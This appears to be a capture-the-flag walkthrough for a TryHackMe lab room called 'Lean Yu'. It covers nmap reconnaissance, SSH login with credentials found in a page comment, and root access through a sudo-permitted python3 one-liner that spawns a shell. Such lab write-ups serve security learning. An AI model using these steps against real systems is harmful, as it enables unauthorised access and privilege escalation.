@@ -1,0 +1,57 @@
+----------------                               ------------------
+               :::::::::::;| LEAN YU |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "LEAN YU".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (22/SSH, 80/HTTP)
+
+3. What's on port 80?
+ANS: Personal portfolio page with "lean_yu" name.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK SOURCE CODE.
+
+    view-source:http://<ip>
+    "Found comment: <!-- secret: lean:password123 -->"
+
+2. LOGIN TO SSH.
+
+    ssh lean@<ip>
+    Password: password123
+    "WE'RE IN AS LEAN!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. CHECK SUDO PERMS.
+
+    sudo -l
+    "Can run /usr/bin/python3 as root!"
+
+2. EXPLOIT PYTHON.
+
+    sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+    "BOOM! ROOT SHELL!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/lean/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- LEAN YU OWNED ----------
